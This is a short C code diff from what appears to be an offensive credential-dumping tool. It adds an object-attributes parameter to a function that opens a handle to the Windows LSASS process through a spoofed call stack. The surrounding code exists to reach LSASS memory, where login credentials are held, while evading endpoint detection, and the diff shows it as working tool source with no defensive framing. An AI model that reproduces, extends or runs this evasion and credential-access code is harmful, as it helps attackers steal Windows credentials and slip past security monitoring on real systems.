@@ -521,7 +521,8 @@ LONG CALLBACK veh_callback(
 HANDLE open_handle_with_spoofed_callstack(
     IN DWORD stack_type,
     IN DWORD lsass_pid,
-    IN DWORD permissions)
+    IN DWORD permissions,
+    IN DWORD attributes)
 {
     DWORD number_of_frames = 0;
     NTSTATUS status = STATUS_UNSUCCESSFUL;
@@ -646,7 +647,7 @@ HANDLE open_handle_with_spoofed_callstack(
     // RDX
     context.Rdx = (DWORD64)permissions;
     // R8
-    InitializeObjectAttributes(&objectAttr, NULL, 0, NULL, NULL);
+    InitializeObjectAttributes(&objectAttr, NULL, attributes, NULL, NULL);
     context.R8 = (DWORD64)&objectAttr;
     // R9
     clientId.UniqueProcess = (HANDLE)(ULONG_PTR)lsass_pid;
@@ -714,7 +715,8 @@ cleanup:
 HANDLE open_handle_with_spoofed_callstack(
     IN DWORD stack_type,
     IN DWORD lsass_pid,
-    IN DWORD permissions)
+    IN DWORD permissions,
+    IN DWORD attributes)
 {
     PRINT_ERR("This function supports x64 only");
     return NULL;
